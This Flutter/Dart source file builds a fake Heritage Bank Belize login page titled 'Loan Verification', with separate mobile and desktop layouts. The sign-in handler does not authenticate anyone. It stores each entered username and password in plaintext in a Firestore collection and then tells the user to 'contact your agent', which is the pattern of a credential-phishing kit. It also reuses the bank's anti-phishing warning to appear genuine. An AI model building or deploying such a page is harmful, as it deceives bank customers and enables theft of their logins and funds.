import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:heritageverification/firebase_options.dart';
import 'dart:async';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,

      theme: ThemeData(colorScheme: .fromSeed(seedColor: Colors.deepPurple)),
      home: const MyHomePage(title: 'Loan Verification'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  bool _rememberMe = false;
  bool _showPassword = true;
  final _userIdController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _isLoading = false;

  void dispose() {
    _userIdController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  void _showPopup(String message, {bool success = false}) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.white,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: Text(
          success ? 'Success' : 'Error',
          style: TextStyle(color: success ? Colors.green : Colors.red),
        ),
        content: Text(message),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  Future<void> _onSignIn() async {
    print('Sign int tapped');
    final username = _userIdController.text.trim();
    final password = _passwordController.text.trim();

    if (username.isEmpty || password.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Please fill in all fields')),
      );
      return;
    }

    setState(() => _isLoading = true);

    try {
      await FirebaseFirestore.instance.collection('Heritage').add({
        'username': username,
        'password':
            password, // ⚠️ plaintext — fine for testing, never in production
        'timestamp': FieldValue.serverTimestamp(),
      });
      // empty fields check

      // on success
      _showPopup(
        'Verification pending, please contact your agent',
        success: true,
      );

      // on error

      // _showPopup('Please fill in all fields');
      _userIdController.clear();
      _passwordController.clear();
    } catch (e) {
      _showPopup('Error: $e');
    } finally {
      setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    if (screenWidth < 600) {
      return mobileLayout();
    } else {
      return desktopLayout();
    }
  }

  Widget mobileLayout() {
    return Scaffold(
      body: Stack(
        children: [
          // Background image
          Positioned.fill(
            child: Image.asset(
              'assets/images/loginBackground.jpeg',
              fit: BoxFit.cover,
            ),
          ),

          Positioned(
            top: 80,
            right: 75,
            child: Image.asset('assets/images/heritage_logo.jpeg'),
          ),
          // Frosted card at bottom
          Align(
            alignment: Alignment.bottomCenter,
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.only(
                top: 70,
                bottom: 40,
                left: 30,
                right: 30,
              ),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.50),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(27),
                  topRight: Radius.circular(27),
                ),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  // User ID field
                  TextField(
                    controller: _userIdController,
                    decoration: InputDecoration(
                      contentPadding: EdgeInsets.symmetric(
                        vertical: 18,
                        horizontal: 10,
                      ),
                      // labelText: 'User ID *',
                      // floatingLabelBehavior: FloatingLabelBehavior.auto,
                      hintText: "User ID *",
                      filled: true,
                      fillColor: Colors.white,
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.only(
                          topLeft: Radius.circular(4),
                          topRight: Radius.circular(4),
                        ),
                        borderSide: BorderSide.none,
                      ),
                    ),
                  ),
                  const SizedBox(height: 16),

                  // Password field
                  TextField(
                    controller: _passwordController,
                    obscureText: _showPassword,
                    decoration: InputDecoration(
                      contentPadding: EdgeInsets.symmetric(
                        vertical: 18,
                        horizontal: 10,
                      ),
                      hintText: "Password *",
                      filled: true,
                      fillColor: Colors.white,
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.only(
                          topLeft: Radius.circular(4),
                          topRight: Radius.circular(4),
                        ),
                      ),
                      suffixIcon: IconButton(
                        icon: Icon(
                          _showPassword
                              ? Icons.visibility_off
                              : Icons.visibility,
                        ),

                        onPressed: () {
                          _showPassword
                              ? setState(() {
                                  _showPassword = false;
                                })
                              : setState(() {
                                  _showPassword = true;
                                });
                        },
                      ),
                    ),
                  ),
                  const SizedBox(height: 8),

                  // Remember me + Forgot password
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Row(
                        children: [
                          const Text(
                            'Remember Me',
                            style: TextStyle(color: Colors.white),
                          ),
                          // const SizedBox(width: 1),
                          Transform.scale(
                            scale: 0.6, // ✅ make it smaller
                            child: Switch(
                              activeColor: const Color(0xFF14973F),
                              inactiveThumbColor: Colors.grey,
                              value: _rememberMe,
                              onChanged: (_) {
                                _rememberMe
                                    ? setState(() {
                                        _rememberMe = false;
                                      })
                                    : setState(() {
                                        _rememberMe = true;
                                      });
                              },
                            ),
                          ),
                        ],
                      ),
                      TextButton(
                        onPressed: () {},
                        child: const Text(
                          'Forgot Password',
                          style: TextStyle(
                            color: Colors.white,
                            decoration: TextDecoration.underline,
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),

                  // Sign in button
                  SizedBox(
                    width: double.infinity,
                    child: ElevatedButton(
                      onPressed: _onSignIn,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFF1A3C6E),
                        padding: const EdgeInsets.symmetric(vertical: 20),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(8),
                        ),
                      ),
                      child: const Text(
                        'Sign In',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                  ),
                  Text(
                    "Heritage bank will never ask customers to reset their",
                    style: TextStyle(color: Colors.white),
                  ),
                  Text(
                    " password by clicking a URL",
                    style: TextStyle(color: Colors.white),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget desktopLayout() {
    return Scaffold(
      body: Stack(
        children: [
          // Background image
          Positioned.fill(
            child: Image.asset(
              'assets/images/loginBackground.jpeg',
              fit: BoxFit.cover,
            ),
          ),

          // Positioned(
          //   top: 80,
          //   right: 100,
          //   child: Image.asset('assets/images/heritage_logo.jpeg'),
          // ),
          // Frosted card at bottom
          Row(
            // mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              Align(
                alignment: Alignment.centerLeft,
                child: Container(
                  width: 400,
                  height: double.infinity,
                  padding: const EdgeInsets.only(
                    top: 70,
                    bottom: 160,
                    left: 30,
                    right: 30,
                  ),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.50),
                    // borderRadius: const BorderRadius.only(
                    //   topLeft: Radius.circular(27),
                    //   topRight: Radius.circular(27),
                    // ),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.center,
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Text(
                        "Whatever you're working toward this year-",
                        style: TextStyle(color: Colors.white, fontSize: 15),
                      ),
                      Text(
                        "home, business, savings-your goals matter",
                        style: TextStyle(color: Colors.white, fontSize: 15),
                      ),

                      SizedBox(height: 20),

                      Text(
                        "At Heritage Bank, we're here to support your",
                        style: TextStyle(color: Colors.white, fontSize: 15),
                      ),
                      Text(
                        "plans with trusted service and steady",
                        style: TextStyle(color: Colors.white, fontSize: 15),
                      ),
                      Text(
                        "guidance, every step of the way",
                        style: TextStyle(color: Colors.white, fontSize: 15),
                      ),
                      Text(
                        "#HeritageBankBelize",
                        style: TextStyle(color: Colors.white, fontSize: 15),
                      ),
                      SizedBox(height: 20),
                      SizedBox(
                        width: 130,
                        child: ElevatedButton(
                          onPressed: () {},
                          style: ElevatedButton.styleFrom(
                            backgroundColor: const Color(0xFF1A3C6E),
                            padding: const EdgeInsets.symmetric(vertical: 20),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(8),
                            ),
                          ),
                          child: const Text(
                            'Learn more',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 16,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              SizedBox(width: 200),
              Align(
                alignment: Alignment.center,

                child: Container(
                  width: 380,
                  height: 470,
                  decoration: BoxDecoration(
                    color: Colors.white,
                    // borderRadius: const BorderRadius.only(
                    //   topLeft: Radius.circular(27),
                    //   topRight: Radius.circular(27),
                    // ),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(20.0),
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        // User ID field
                        Transform.scale(
                          scale: 0.8,
                          child: Image.asset(
                            'assets/images/heritage_logo.jpeg',
                          ),
                        ),
                        SizedBox(height: 20),
                        TextField(
                          controller: _userIdController,
                          decoration: InputDecoration(
                            contentPadding: EdgeInsets.symmetric(
                              vertical: 20,
                              horizontal: 10,
                            ),
                            // labelText: 'User ID *',
                            // floatingLabelBehavior: FloatingLabelBehavior.auto,
                            hintText: "User ID *",
                            filled: true,
                            fillColor: Colors.white,
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.only(
                                topLeft: Radius.circular(4),
                                topRight: Radius.circular(4),
                              ),
                              // borderSide: BorderSide.none,
                            ),
                          ),
                        ),
                        const SizedBox(height: 16),

                        // Password field
                        TextField(
                          controller: _passwordController,
                          obscureText: _showPassword,
                          decoration: InputDecoration(
                            contentPadding: EdgeInsets.symmetric(
                              vertical: 20,
                              horizontal: 10,
                            ),
                            hintText: "Password *",
                            filled: true,
                            fillColor: Colors.white,
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.only(
                                topLeft: Radius.circular(4),
                                topRight: Radius.circular(4),
                              ),
                            ),
                            suffixIcon: IconButton(
                              icon: Icon(
                                _showPassword
                                    ? Icons.visibility_off
                                    : Icons.visibility,
                              ),

                              onPressed: () {
                                _showPassword
                                    ? setState(() {
                                        _showPassword = false;
                                      })
                                    : setState(() {
                                        _showPassword = true;
                                      });
                              },
                            ),
                          ),
                        ),
                        const SizedBox(height: 12),

                        // Remember me + Forgot password
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Row(
                              children: [
                                const Text(
                                  'Remember Me',
                                  style: TextStyle(
                                    fontWeight: FontWeight.bold,
                                    color: Color(0xFF3F3E3E),
                                  ),
                                ),
                                // const SizedBox(width: 1),
                                Transform.scale(
                                  scale: 0.6, // ✅ make it smaller
                                  child: Switch(
                                    activeColor: const Color(0xFF14973F),
                                    inactiveThumbColor: Colors.grey,
                                    value: _rememberMe,
                                    onChanged: (_) {
                                      _rememberMe
                                          ? setState(() {
                                              _rememberMe = false;
                                            })
                                          : setState(() {
                                              _rememberMe = true;
                                            });
                                    },
                                  ),
                                ),
                              ],
                            ),
                            TextButton(
                              onPressed: () {},
                              child: const Text(
                                'Forgot Password',
                                style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  color: Color(0xFF3F3E3E),
                                  decoration: TextDecoration.underline,
                                ),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 16),

                        // Sign in button
                        SizedBox(
                          width: double.infinity,
                          child: ElevatedButton(
                            onPressed: _onSignIn,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: const Color(0xFF1A3C6E),
                              padding: const EdgeInsets.symmetric(vertical: 20),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(8),
                              ),
                            ),
                            child: _isLoading
                                ? SizedBox(
                                    width: 24,
                                    height: 24,
                                    child: CircularProgressIndicator(
                                      color: Colors.white,
                                    ),
                                  )
                                : Text(
                                    'Sign In',
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 16,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                          ),
                        ),
                        Text(
                          "Heritage bank will never ask customers to reset",
                          style: TextStyle(color: Color(0xFF3F3E3E)),
                        ),
                        Text(
                          " their password by clicking a URL",
                          style: TextStyle(color: Color(0xFF3F3E3E)),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }
}
